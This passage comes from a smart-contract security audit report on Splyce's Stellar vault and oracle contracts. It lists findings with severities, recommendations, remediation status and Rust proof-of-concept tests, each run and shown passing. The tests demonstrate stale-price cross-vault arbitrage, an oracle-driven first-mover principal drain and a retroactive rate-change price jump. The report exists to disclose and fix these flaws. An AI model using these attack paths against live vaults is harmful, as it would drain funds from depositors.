        .swap_tokens(&attacker, &vault_a.address, &attacker_b_shares, &0u64);

    let attacker_shares_after = vault_a.client.balance(&attacker) as u64;

    // ─── §F: Exploit confirmed — risk-free profit extracted ────────────────────
    assert!(
        attacker_shares_after > attacker_shares_before,
        "EXPLOIT: attacker ends with {} A-shares, started with {} — gain: {}",
        attacker_shares_after,
        attacker_shares_before,
        attacker_shares_after - attacker_shares_before,
    );
    // Profit exactly equals 1% of deployed capital, matching the pending price delta
    assert_eq!(
        attacker_shares_after - attacker_shares_before,
        10_000,
        "attacker extracted 10_000 A-shares (1% of 1_000_000) via pending-price arbitrage"
    );
}
```

#### Execution

```sh
cargo test -p stoken -- poc_pending_price
```

#### Result

```sh
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.39s
     Running unittests src/lib.rs (target/debug/deps/stoken-dfab708e60ece339)

running 1 test
test test::poc_pending_price_enables_risk_free_cross_vault_arbitrage ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 144 filtered out; finished in 0.17s
```

#### Analysis

The test deploys two mutually allowlisted vaults (A and B) sharing the same underlying token and asset manager, which is the standard configuration for any cross-vault swap pair. Vault A's price stays at `1_000_000` throughout. An oracle submits a legitimate +1% price update (`1_010_000`) to vault B; because 1% exceeds the 50 bps `max_deviation_bps` threshold, the price is stored as a `PendingPrice` and NOT applied to the live price.

- **§B (over-allocation at stale price):** The attacker calls `vault_A.swap_tokens(attacker, vault_B, 1_000_000, 0)` immediately after the pending price is published. `swap_tokens` reads `read_price(&env)` at line 2170 and `desitnation_vault_client.price()` at line 2171: neither call checks for a queued `PendingPrice`. The exchange rate is computed at the stale `P_B_old = 1_000_000`, so the attacker receives `1_000_000` B-shares when those shares are actually already worth `1_010_000 / 1_000_000 = 1.01` in pending terms.
- **§D–§E (price accepted, profit crystallized):** After the 300-second cooldown, `accept_price` raises vault B's live price to `1_010_000`. The attacker immediately swaps back: `vault_B.swap_tokens(attacker, vault_A, 1_000_000, 0)`. The exchange math now applies the elevated price, minting `1_000_000 × 1_010_000 / 1_000_000 = 1_010_000` A-shares to the attacker.
- **§F (profit assertion):** The final `assert_eq!(attacker_shares_after - attacker_shares_before, 10_000)` confirms the attacker recovered `1_010_000` A-shares against a starting balance of `1_000_000`, a net gain of `10_000` A-shares (1% of deployed capital) extracted in two transactions with no capital at risk. If the pending price had been rejected, the attacker would simply swap back at par, losing only Soroban transaction fees. The `DEFAULT_SWAP_FEE_BPS = 0` default (constants.rs:65) makes both legs frictionless. The new A-shares were minted without any corresponding underlying entering vault A, permanently diluting vault A's existing depositors by exactly the attacker's gain.

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Block `deposit_core`, `redeem_core`, and `swap_tokens` (both source and destination sides) when a `PendingPrice` is queued on the relevant vault. The existing `PendingPrice` storage entry serves as the signal: no new flag or cross-contract accessor is needed, as `accept_price` and `reject_price` already clear it.
- For the destination-vault check in `swap_tokens`, read the destination vault's pending price storage directly rather than adding a dedicated accessor, avoiding a new cross-contract interface dependency.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding a `read_pending_price(env).is_some()` guard to `deposit_core` and `redeem_core` that rejects with `PriceTooOld` while a pending price is queued, complementing the pre-existing `swap_tokens` guard (FIND-024) so all three vectors are blocked until the pending price resolves.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-003] FixedYield Time-Based Price Curve Enables First-Mover Principal Drain

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 6.28 (AO:A/AC:L/AX:M/R:N/S:C/C:N/A:N/I:N/D:H/Y:N) (source: HAL-03) |
| **Difficulty / likelihood** | null |
| **Status** | Risk Accepted |
| **Remediation verified by** | not-reviewed |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs:L352` |
| **Resolved in** | null |
| **Redacted** | false |

**Description.**

`FixedYieldOracle.calculate_current_price` (fixed_yield_oracle.rs:352) computes share price as a pure function of elapsed time and the configured `annual_rate_bps`, reading `read_created_at`, `read_initial_price`, and `read_annual_rate_bps` with no reference to vault solvency, underlying token balance, or total share supply. When the externally managed portfolio underperforms or incurs losses, the oracle continues reporting a monotonically increasing price regardless of the vault's actual asset-to-share ratio. Any token holder who redeems shares at the overstated price exits with more underlying than the vault's per-share entitlement.

**Exploit path (no privileged actor required; triggered whenever portfolio return lags the oracle curve):**

1. `FixedYieldOracle` is deployed and configured with `initial_price = 1_000_000`, `annual_rate_bps = 500` (5% APY), targeting a vault.
2. Over time the externally managed portfolio earns only 2% per year. The oracle reports price as though 5% was earned.
3. `update_vault_price_from_yield` is called; `calculate_current_price` returns a price that exceeds actual NAV per share.
4. Any holder can call `withdraw_request` at the inflated price. `amount_due = shares * oracle_price / PRICE_PRECISION` exceeds the true underlying entitlement.
5. Early holders who fulfill withdrawals at the oracle price drain excess underlying from the vault, extracting more underlying than their proportional entitlement.

#### Code Location

`FixedYieldOracle.calculate_current_price()`: price depends only on time, no solvency reference

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (lines 352-394)
pub fn calculate_current_price(
    env: Env,
    current_timestamp: u64,
) -> Result<u64, FixedYieldOracleError> {
    let created_at = read_created_at(&env);
    // ...
    let initial_price = read_initial_price(&env);
    let elapsed_seconds = current_timestamp - created_at;
    // ...
    let rate_factor = (read_annual_rate_bps(&env) as u128)
        .checked_mul(elapsed_years_scaled)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?
        .checked_div(10000u128)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?;
    let multiplier = (PRICE_PRECISION as u128)
        .checked_add(rate_factor)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?;
    let calculated_price = (initial_price as u128)
        .checked_mul(multiplier)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?
        .checked_div(PRICE_PRECISION as u128)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?;
    // ...
}
```

**Impact.**

When the externally managed portfolio underperforms the configured yield curve, any share holder can exit at a price that exceeds the vault's actual per-share underlying entitlement. Each such redemption reduces the asset pool available for remaining holders. The loss is not recoverable on-chain: the vault has no mechanism to claw back overpaid redemptions. The manager's only operational lever is to pause the vault, which requires timely detection before significant capital has already exited. If the underperformance is gradual or undetected, the oracle will systematically overpay every redemption, cumulatively draining the vault's underlying reserves and imposing permanent principal loss on late redeemers.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/stoken/src/test.rs` file, under the test function `poc_fixedyield_time_based_price_curve_first_mover_drain`. The test drives a real, unmodified `FixedYieldOracle` contract (added as a dev-dependency of `stoken`, path `contracts/fixed_yield_oracle`) as the vault's `oracle` role, so the reported prices are the actual output of production code rather than a re-implementation of its math.

```rust
// ─── PoC: FixedYield Time-Based Price Curve Enables First-Mover Principal Drain ──
//
// Demonstrates the finding "FixedYield Time-Based Price Curve Enables First-Mover
// Principal Drain": FixedYieldOracle.calculate_current_price (fixed_yield_oracle.rs:352)
// derives the vault's share price purely from elapsed time and the configured
// annual_rate_bps, with no reference to the vault's actual underlying balance or
// total share supply. When the externally managed portfolio earns less than the
// configured rate (here: 0% real yield vs. a 5% APY oracle), the vault keeps
// reporting a rising price the assets do not back, and whoever redeems first
// extracts more than their fair share, permanently diluting later redeemers.
//
// This test drives a REAL, unmodified FixedYieldOracle contract (not a mock) as
// the vault's "oracle" role, so the price values below are the actual output of
// production code, not a re-implementation of its math.
//
// §A: two depositors, Alice and Bob, each deposit 100_000_000 units at price
//     1:1 into a real SToken vault whose `oracle` role is held by a real
//     FixedYieldOracle instance (5% APY, created at t=0).
// §B: the externally managed portfolio earns nothing (`total_idle` never
//     changes — no process_deposits/return_funds cycle occurs), yet the real
//     oracle is pushed forward across 10 tenth-of-a-year hops. Each push is
//     computed by the real `calculate_current_price` formula and lands within
//     stoken's 50 bps auto-accept window (utils.rs::calculate_price_deviation),
//     so every step auto-applies with zero manager intervention.
// §C: after exactly 1 year the oracle-reported price is 1_050_000 (+5%), while
//     the vault's real backing ratio (total_idle / total_supply) is still
//     exactly 1_000_000 (0% real yield — the assets never moved).
// §D: Alice calls withdraw_request + fulfill_withdrawal for all of her shares.
//     amount_due is computed by stoken's real redemption code at the inflated
//     oracle price: she receives 105_000_000 — 5_000_000 more than her
//     100_000_000 principal, funded entirely out of Bob's deposit.
// §E: Bob's remaining backing ratio has dropped from 1_000_000 to 950_000 (a
//     permanent 5% loss) even though the real underlying assets never lost a
//     single unit — the loss is manufactured entirely by the oracle's
//     solvency-blind, time-based price curve.
#[test]
fn poc_fixedyield_time_based_price_curve_first_mover_drain() {
    use fixed_yield_oracle::fixed_yield_oracle::{FixedYieldOracle, FixedYieldOracleClient, SECONDS_PER_YEAR as FYO_SECONDS_PER_YEAR};

    let env = Env::default();
    env.ledger().with_mut(|li| li.timestamp = 0);

    let token_owner = Address::generate(&env);
    let asset_manager = Address::generate(&env);
    let alice = Address::generate(&env);
    let bob = Address::generate(&env);
    let oracle_authority = Address::generate(&env);
    let oracle_manager = Address::generate(&env);

    let token_client = create_token_contract(&env, &token_owner);
    fund_user(&env, &token_client, &token_owner, &alice, 100_000_000);
    fund_user(&env, &token_client, &token_owner, &bob, 100_000_000);

    // §A: register the real stoken vault first so its address is known, then
    // deploy the real FixedYieldOracle pointed at it (5% APY, created at t=0).
    let stoken_address = env.register(SToken, ());
    let stoken_client = STokenClient::new(&env, &stoken_address);

    let oracle_address = env.register(FixedYieldOracle, ());
    let oracle_client = FixedYieldOracleClient::new(&env, &oracle_address);
    oracle_client.initialize(
        &stoken_address,
        &oracle_authority,
        &oracle_manager,
        &1_000_000u64, // initial_price = PRICE_PRECISION
        &500u64,       // 5% APY
        &0u64,         // cooldown_secs (unenforced on the update path regardless — see cooldown finding)
    );

    let (mut config, admin, manager, processor, accountant, _unused_oracle) =
        default_vault_config(&env, &token_client.address, &asset_manager);
    config.oracle = oracle_address.clone();
    stoken_client.initialize(&config);

    let vault = VaultTestContext {
        client: stoken_client,
        address: stoken_address.clone(),
        admin,
        manager,
        oracle: oracle_address.clone(),
        processor,
        accountant,
        asset_manager: asset_manager.clone(),
    };

    deposit_underlying(&env, &vault, &token_client, &alice, 100_000_000);
    deposit_underlying(&env, &vault, &token_client, &bob, 100_000_000);

    assert_eq!(vault.client.total_idle(), 200_000_000, "§A: 200_000_000 real backing after both deposits");
    assert_eq!(vault.client.total_shares(), 200_000_000, "§A: 200_000_000 shares minted at price 1:1");

    // §B: push the real oracle forward 10 times, a tenth-of-a-year each hop.
    // At 5% APY, each 0.1-year hop raises calculate_current_price by exactly
    // 5_000 (fixed_yield_oracle.rs:383-398), which is <= 50 bps of the
    // then-current price — stoken's default max_deviation_bps — so every push
    // auto-applies with zero manager intervention (stoken.rs:967-973).
    let one_tenth_year = FYO_SECONDS_PER_YEAR as u64 / 10;
    for hop in 1..=10u64 {
        env.ledger().with_mut(|li| li.timestamp = hop * one_tenth_year);
        oracle_client
            .mock_auths(&[MockAuth {
                address: &oracle_manager,
                invoke: &MockAuthInvoke {
                    contract: &oracle_address,
                    fn_name: "update_vault_price_from_yield",
                    args: (oracle_manager.clone(),).into_val(&env),
                    sub_invokes: &[],
                },
            }])
            .update_vault_price_from_yield(&oracle_manager);
    }

    // §C: oracle-reported price is inflated 5%; real backing ratio is unchanged
    // because total_idle never moved (the portfolio earned 0% in reality).
    assert_eq!(vault.client.price(), 1_050_000, "§C: real oracle pushed price to +5% after 1 year");
    assert_eq!(vault.client.total_idle(), 200_000_000, "§C: real backing never changed — 0% actual yield");
    assert_eq!(vault.client.total_shares(), 200_000_000, "§C: no shares minted or burned yet");

    // §D: Alice redeems all 100_000_000 shares at the inflated price. stoken's
    // real redemption math (amount_due = shares * price / PRICE_PRECISION)
    // pays her 105_000_000 — 5_000_000 more than she deposited.
    withdraw_request_helper(&env, &vault, &alice, 100_000_000, 0);
    let (_shares, amount_due, _min_out, _fee_shares) = vault.client.get_withdraw_request(&1);
    assert_eq!(amount_due, 105_000_000, "§D: Alice's payout is inflated by the unfunded 5% price rise");

    env.mock_all_auths_allowing_non_root_auth();
    vault.client.fulfill_withdrawal(&alice, &1, &vault.processor);

    assert_eq!(
        token_client.balance(&alice),
        105_000_000i128,
        "§D: Alice extracted 5_000_000 more than her 100_000_000 principal"
    );

    // §E: the 5_000_000 excess came out of Bob's deposit. His shares are
    // unchanged, but the vault's remaining backing ratio has permanently
    // dropped from 1_000_000 to 950_000 — a 5% principal loss he never agreed
    // to and that no on-chain mechanism lets him recover.
    assert_eq!(vault.client.total_idle(), 95_000_000, "§E: vault total_idle after Alice's inflated payout");
    assert_eq!(vault.client.total_shares(), 100_000_000, "§E: only Bob's shares remain outstanding");

    let bobs_backing_ratio =
        (vault.client.total_idle() as u128) * 1_000_000 / (vault.client.total_shares() as u128);
    assert_eq!(
        bobs_backing_ratio, 950_000,
        "§E: Bob's real backing per share fell 5% (1_000_000 -> 950_000) though the vault's real \
         assets never actually lost a single underlying unit — the loss is manufactured entirely \
         by FixedYieldOracle's solvency-blind, time-based price curve"
    );
}
```

#### Execution

```sh
cargo test -p stoken --lib -- test::poc_fixedyield_time_based_price_curve_first_mover_drain --exact --nocapture
```

#### Result

```sh
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.39s
     Running unittests src/lib.rs (target/debug/deps/stoken-8009f0407c44966b)

running 1 test
test test::poc_fixedyield_time_based_price_curve_first_mover_drain ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 146 filtered out; finished in 0.14s
```

#### Analysis

The test deploys a real `SToken` vault and grants the `oracle` role to a real, unmodified `FixedYieldOracle` instance configured for 5% APY. Alice and Bob each deposit 100,000,000 units at the initial 1:1 price (§A), so the vault's real backing ratio (`total_idle` / `total_supply`) starts at exactly 1,000,000. The externally managed portfolio is then simulated to earn **0% real yield** — `total_idle` is never touched by any deposit/return cycle for the rest of the test — while the real oracle is pushed forward across ten 0.1-year hops (§B), each computed by the production `calculate_current_price` formula (fixed_yield_oracle.rs:352–402) and each landing within stoken's 50 bps auto-accept window, so every push applies with zero manager intervention.

- §C proves the divergence directly: after exactly one year, `vault.client.price()` reports 1,050,000 (a real +5% oracle-driven increase) while `total_idle` is still 200,000,000 and `total_shares` is still 200,000,000 — i.e. the real backing ratio is unchanged at 1,000,000. The oracle's price and the vault's actual solvency have diverged by exactly the unfunded 5%.
- §D exercises stoken's real redemption path: `withdraw_request` computes `amount_due = shares * price / PRICE_PRECISION` and stores 105,000,000 for Alice's 100,000,000 shares; `fulfill_withdrawal` then pays her that exact inflated amount out of the vault's real token balance. Alice extracts 5,000,000 more underlying than she deposited, entirely funded by Bob's capital.
- §E quantifies the resulting loss for the remaining holder: after Alice's payout, `total_idle` is 95,000,000 against Bob's 100,000,000 outstanding shares, a real backing ratio of 950,000 — a permanent 5% loss Bob never agreed to, even though the vault's real underlying assets never actually lost a single unit. The loss is manufactured entirely by `FixedYieldOracle.calculate_current_price` being a pure function of elapsed time and configured rate, with no reference to the vault's actual balance or supply, exactly as described in the finding's impact section.

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add an on-chain solvency ceiling to `update_vault_price_from_yield`: before pushing the time-derived price to `stoken.update_price`, compute `actual_price = vault_underlying_balance * PRICE_PRECISION / total_supply` (the same approach used by `NavOracle`) and cap the published price at `min(calculated_price, actual_price)`. This ensures the oracle can never report a price above the vault's real asset backing regardless of the configured yield rate.
- Extract the `actual_price` computation into a shared library function so that both `NavOracle` and `FixedYieldOracle` use identical logic and any future correction only needs to be made in one place.

**Remediation notes.**

**RISK ACCEPTED**: The **Splyce team** made a business decision to accept the risk of this finding and not alter the contracts, stating that:

> Operator-guaranteed liability model: FixedYield price is a pure time curve, not a solvency oracle. An on-chain idle solvency cap is inapplicable when capital is deployed off-vault. Documented in 2813eac9254bde2aa8c42e9cc97adf1c57cef587; no code change to the curve.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-004] FixedYieldOracle Retroactive Rate Application Causes Discontinuous Price Jumps

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 6.28 (AO:A/AC:L/AX:M/R:N/S:C/C:N/A:N/I:N/D:H/Y:N) (source: HAL-04) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/83521aa23af19af7f234324c74614d3525a44a73 |
| **Redacted** | false |

**Description.**

`FixedYieldOracle.calculate_current_price()` always computes share price using the *current* `annual_rate_bps` applied retroactively from `created_at` (the oracle's original deployment timestamp), so any governance rate change immediately re-prices the entire elapsed history with no snapshot or rebase of the starting point.

The flaw exists in `accept_yield_parameters()` (lines 200-232): after the cooldown expires, it writes the new rate via `write_annual_rate_bps` without first capturing the price accrued under the old rate. From that moment, every subsequent call to `calculate_current_price()` uses the new rate times the full elapsed period since oracle creation, producing a discontinuous price jump or drop.

This produces two independent harmful effects:

**Effect 1: Rate-increase insolvency (requires actor holding both FixedYieldOracle** `manager` **role AND stoken** `manager` **role):**

1. T=0: Oracle deployed with `initial_price=1_000_000`, `rate=500 bps` (5%).
2. T=1 year: Accepted price = 1,050,000.
3. Insider proposes and accepts `rate=1000 bps` (10%) via `propose_yield_parameters` / `accept_yield_parameters`.
4. Next call to `update_vault_price_from_yield` invokes `calculate_current_price`, which now returns `1_000_000 × (1 + 10% × 1.0) = 1_100,000`, a sudden +50,000 jump unfunded by actual assets.
5. Large deviation creates a `PendingPrice`; the same actor (also stoken `manager`) calls `accept_price`, writing a share price of 1,100,000 while vault assets still back only 1,050,000.

**Effect 2: Rate-decrease swap-drain (attacker is any EOA holding vault A shares):**

1. T=0: `initial_price=1_000_000`, `rate=1000 bps`. After 1 year, accepted price = 1,100,000.
2. Manager lowers rate to 100 bps; next oracle push computes `1_010_000` (~8.2% retroactive drop) → `PendingPrice` queued in stoken.
3. Before the stoken manager calls `accept_price`, any holder of vault A shares calls `swap_tokens(vault_A → vault_B)`. Vault A shares are valued at the stale accepted price (1,100,000) while vault B shares are issued at the correct current price, so the attacker exits at the inflated price.
4. Manager accepts `PendingPrice`, confirming the 8.2% retroactive price drop for remaining vault A holders.

#### Code Location

`FixedYieldOracle.calculate_current_price()`: retroactive rate application

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (lines 352-394)
pub fn calculate_current_price(
    env: Env,
    current_timestamp: u64,
) -> Result<u64, FixedYieldOracleError> {
    let created_at = read_created_at(&env);          // fixed at deployment, never updated
    // ...
    let rate_factor = (read_annual_rate_bps(&env) as u128)  // always current rate
        .checked_mul(elapsed_years_scaled)
        // ...
    let calculated_price = (initial_price as u128)   // always original initial_price
        .checked_mul(multiplier)
        // ...
}
```

`FixedYieldOracle.accept_yield_parameters()`: missing price snapshot before rate write

```rust
// contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs (line 217)
pub fn accept_yield_parameters(
    env: Env,
    caller: Address,
) -> Result<(), FixedYieldOracleError> {
    // ...
    write_annual_rate_bps(&env, &pending.new_annual_rate_bps); // new rate written
    // ^^^ no snapshot of accrued price, no rebase of initial_price / created_at
    write_pending_yield_params(&env, None);
    // ...
}
```

**Impact.**

- **Rate increase:** the vault becomes insolvent relative to share NAV (on-chain token balances are unchanged; the insolvency is between reported share value and actual underlying). Scale of the gap is `(old_price - new_retroactive_price) × total_supply / PRICE_PRECISION` underlying units.
- **Rate decrease + swap drain:** any EOA holding vault A shares can exit at the stale inflated price into a sibling vault within the `PendingPrice` acceptance window, concentrating the retroactive loss on remaining vault A holders. No special privileges beyond holding shares and having a mutual-allowlist sibling vault are required.

**Proof / attack path.**

#### Code

The PoC code has been added to the existing test suite located in the `contracts/fixed_yield_oracle/src/test.rs` file, under the test function `poc_retroactive_rate_application_causes_discontinuous_price_jump`.

```rust
// ─── PoC: Retroactive Rate Application Causes Discontinuous Price Jumps ────
//
// Demonstrates the finding "FixedYieldOracle Retroactive Rate Application Causes
// Discontinuous Price Jumps": `calculate_current_price` (fixed_yield_oracle.rs:352)
// always recomputes the FULL elapsed period since `created_at` using whatever
// `annual_rate_bps` is CURRENTLY stored. `accept_yield_parameters` (lines 202-232)
// writes the new rate with no snapshot of the price already accrued under the
// old rate, so a governance rate change retroactively re-prices the entire
// history instead of only applying forward from the moment of the change.
//
// §A: oracle deployed at 5% APY, t=0. After exactly 1 year the fair, correctly
//     accrued price is 1_050_000 — this is "Effect 1" step 2 from the finding.
// §B: manager proposes and accepts a new rate of 10% APY. No portfolio-relevant
//     time passes between §A and §B: we evaluate calculate_current_price at the
//     SAME one-year timestamp both before and after the rate change, isolating
//     the effect of the rate change itself from any additional elapsed time.
// §C: the price at that identical timestamp jumps from 1_050_000 to 1_100_000 —
//     a +50_000 (+4.76%) increase materialized instantly, with zero elapsed
//     time and zero additional real yield, purely because the new 10% rate was
//     applied to the full one-year history instead of continuing forward from
//     the 1_050_000 baseline already accrued under the old 5% rate.
#[test]
fn poc_retroactive_rate_application_causes_discontinuous_price_jump() {
    let env = Env::default();
    env.ledger().with_mut(|li| li.timestamp = 0);

    // §A: 5% APY oracle, 1-hour cooldown so the propose/accept flow requires a
    // genuine wait (matches the finding's premise of a governance rate change).
    let ctx = setup_fyo(&env, PRICE_PRECISION, 500, 3600);

    let one_year = SECONDS_PER_YEAR as u64;
    env.ledger().with_mut(|li| li.timestamp = one_year);

    let price_before_rate_change = ctx.client.calculate_current_price(&one_year);
    assert_eq!(
        price_before_rate_change, 1_050_000,
        "§A: after 1 year at 5% APY the fair, correctly accrued price is 1_050_000"
    );

    // §B: manager proposes 10% APY and accepts it once the cooldown has passed.
    // The cooldown wait only advances the ledger clock for the PROPOSAL check —
    // calculate_current_price will still be evaluated at the original `one_year`
    // mark below, so no additional real elapsed time enters the comparison.
    ctx.client
        .mock_auths(&[MockAuth {
            address: &ctx.manager,
            invoke: &MockAuthInvoke {
                contract: &ctx.address,
                fn_name: "propose_yield_parameters",
                args: (1000u64, ctx.manager.clone()).into_val(&env),
                sub_invokes: &[],
            },
        }])
        .propose_yield_parameters(&1000, &ctx.manager);

    env.ledger().with_mut(|li| li.timestamp = one_year + 3601);

    ctx.client
        .mock_auths(&[MockAuth {
            address: &ctx.manager,
            invoke: &MockAuthInvoke {
                contract: &ctx.address,
                fn_name: "accept_yield_parameters",
                args: (ctx.manager.clone(),).into_val(&env),
                sub_invokes: &[],
            },
        }])
        .accept_yield_parameters(&ctx.manager);

    // §C: re-evaluate at the SAME `one_year` timestamp used in §A. Only the
    // stored annual_rate_bps changed (5% -> 10%); calculate_current_price
    // retroactively reprices the entire elapsed year under the new rate
    // instead of forward-applying it from the 1_050_000 baseline.
    let price_after_rate_change = ctx.client.calculate_current_price(&one_year);
    assert_eq!(
        price_after_rate_change, 1_100_000,
        "§C: retroactive rate application recomputes the FULL year at 10% (1_000_000 * 1.10), \
         not the 1_050_000 baseline plus a forward-only delta"
    );

    let unfunded_jump = price_after_rate_change - price_before_rate_change;
    assert_eq!(
        unfunded_jump, 50_000,
        "§C: a +50_000 (+4.76%) price jump materializes instantly, with zero elapsed time and \
         zero additional real yield — this jump is entirely unfunded by the vault's actual assets \
         and would be pushed straight to stoken.update_price on the very next oracle call"
    );
}
```

#### Execution

```sh
cargo test -p fixed_yield_oracle --lib -- test::poc_retroactive_rate_application_causes_discontinuous_price_jump --exact --nocapture
```

#### Result

```sh
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.37s
     Running unittests src/lib.rs (target/debug/deps/fixed_yield_oracle-be915368336db95d)

running 1 test
test test::poc_retroactive_rate_application_causes_discontinuous_price_jump ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 16 filtered out; finished in 0.02s
```

#### Analysis

The test deploys a real `FixedYieldOracle` at 5% APY, created at t=0 (§A). After exactly one year, `calculate_current_price(one_year)` correctly returns 1,050,000 — the fair value accrued under the original rate, matching "Effect 1" step 2 of the finding. The manager then proposes and accepts a new rate of 10% APY (§B) through the real `propose_yield_parameters` / `accept_yield_parameters` two-step flow, waiting the full configured cooldown so the change is legitimately accepted governance, not a bypass.

- §C is the conclusive proof: `calculate_current_price` is evaluated again at the exact same `one_year` timestamp used in §A — no additional real time has elapsed and the externally managed portfolio has not earned a single additional second of yield. Despite this, the returned price jumps from 1,050,000 to 1,100,000, an exact match for `1_000_000 * (1 + 10% * 1.0)`: the new 10% rate was applied retroactively to the *entire* one-year history since `created_at`, rather than continuing forward from the 1,050,000 baseline already accrued under the old 5% rate.
- The assertion on `unfunded_jump == 50_000` quantifies the discontinuity precisely: a +4.76% price increase materializes in a single governance transaction with zero elapsed time and zero real yield behind it. This is exactly the mechanism described in the finding's "Rate-increase insolvency" effect: the next call to `update_vault_price_from_yield` would push this unfunded 1,100,000 price straight into `stoken.update_price`, and if accepted (directly if within `max_deviation_bps`, or via manager acceptance of a `PendingPrice` otherwise), the vault would report a share price the underlying assets do not back — confirming `accept_yield_parameters` (fixed_yield_oracle.rs:202–232) is missing the price snapshot/rebase step needed to make rate changes apply only going forward.

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- **Snapshot price at rate-change time**: in `accept_yield_parameters`, before writing the new rate, compute the price accrued under the old rate and rebase `initial_price` and `created_at` to forward-apply only the new rate. This ensures price continuity: no retroactive repricing, no discontinuous jumps.
- **Monotonicity guard for rate-decrease case**: in `update_vault_price_from_yield`, reject a computed price that is below the last accepted vault price, enforcing the protocol's non-decreasing price invariant:
- **Block swaps during pending-price window**: in `SToken.swap_tokens`, check that neither the source nor destination vault has a `PendingPrice` and revert if so, eliminating the acceptance-window extraction path.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by rebasing `initial_price` and `created_at` to the price accrued under the old rate at the moment `accept_yield_parameters` takes effect, so the new rate applies strictly forward with no discontinuous retroactive jump or drop.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-005] Accept Allowlist Mint Skips Deviation And Staleness Parity

| Field | Value |
|---|---|
| **Unified severity** | Moderate |
| **Firm severity rating** | Medium, BVSS 2.0 6.28 (AO:A/AC:L/AX:M/R:N/S:C/C:N/A:N/I:N/D:H/Y:N) (source: HAL-05) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | access-control-auth |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/0095517510bf2cc9e5330989f7bfd2cd9bc24c6a |
| **Redacted** | false |

**Description.**

`SToken.accept_allowlist_mint()` establishes mutual swap trust between two vaults using only an `asset_manager` equality check, and `SToken.swap_tokens()` subsequently reads each vault's price-staleness bound independently rather than enforcing any parity between the two vaults' safety parameters.

1. Vault A and vault B share the same `asset_manager`. A's manager calls `accept_allowlist_mint(vault_B, manager)` (and vice versa on B); the only check performed is `asset_manager != this_asset_manager`, so any mismatch between the two vaults' `max_deviation_bps` or `max_price_staleness_secs` is never inspected.
2. Vault B's manager, the same operational entity as vault A's or a compromised instance of it, raises B's `max_price_staleness_secs` (or `max_deviation_bps`) to a large value. B's own price-update path never flags this as unsafe, since it remains within B's own configured bounds.
3. Any account calls `vault_A.swap_tokens(caller, vault_B, source_amount, min_destination_amount)`. `swap_tokens` reads `dest_max_staleness` via `desitnation_vault_client.max_price_staleness_secs()` and compares B's own last-update timestamp only against B's own bound; it never checks that bound against A's `max_price_staleness_secs`, and never compares either vault's `max_deviation_bps` at all.
4. The swap mints destination-vault shares to the caller using B's price, which is stale or deviated relative to what A's own policy would ever tolerate, but still fresh by B's independently configurable rules.

#### Code Location

`SToken.accept_allowlist_mint()`**:** only checks `asset_manager` equality

```rust
// contracts/stoken/src/stoken.rs
let asset_manager = vault_client.asset_manager(); // line 2676

let this_asset_manager = Self::get_first_role_member(&env, asset_manager_role)
    .expect("SToken: Missing asset manager");

if asset_manager != this_asset_manager {
    return Err(STokenAllowlistMintError::AssetManagerMismatch);
}
// no comparison of vault_client.max_deviation_bps() or vault_client.max_price_staleness_secs()
```

`SToken.swap_tokens()`**:** destination staleness checked only against its own independently configurable bound

```rust
// contracts/stoken/src/stoken.rs
let dest_last_price_ts = desitnation_vault_client.last_price_update_timestamp(); // line 2149
let dest_max_staleness = desitnation_vault_client.max_price_staleness_secs();
if dest_last_price_ts > 0 && dest_max_staleness > 0 {
    let price_age = env.ledger().timestamp().saturating_sub(dest_last_price_ts);
    if price_age > dest_max_staleness {
        return Err(STokenSwapError::PriceTooOld);
    }
}
// no comparison against source_max_staleness (line 2137) or either vault's max_deviation_bps
```

**Impact.**

A shared operator, or a single compromised vault among several sharing an `asset_manager`, can let one vault's price drift further from fair value than its sibling vault would ever tolerate on its own price-update path, since the swap layer applies no independent check to catch the asymmetry. Any account that swaps into the mispriced vault captures the differential at the expense of that vault's existing depositors, who bear the diluted or overpaid redemption value on their next withdrawal.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend requiring `accept_allowlist_mint` to verify that the destination vault's `max_deviation_bps` and `max_price_staleness_secs` are no looser than the source vault's before allowlisting it, and re-verifying that parity at swap time in `swap_tokens` so a later parameter change on either side cannot silently reopen the gap. Treat `0` on either parameter as fully disabled, the loosest possible setting rather than the tightest, so the comparison cannot wave through a vault that has turned its safety checks off entirely. Note this bounds policy asymmetry between vaults; it does not by itself bound staleness risk within a single vault's own accepted price, which is addressed separately.

**Remediation notes.**

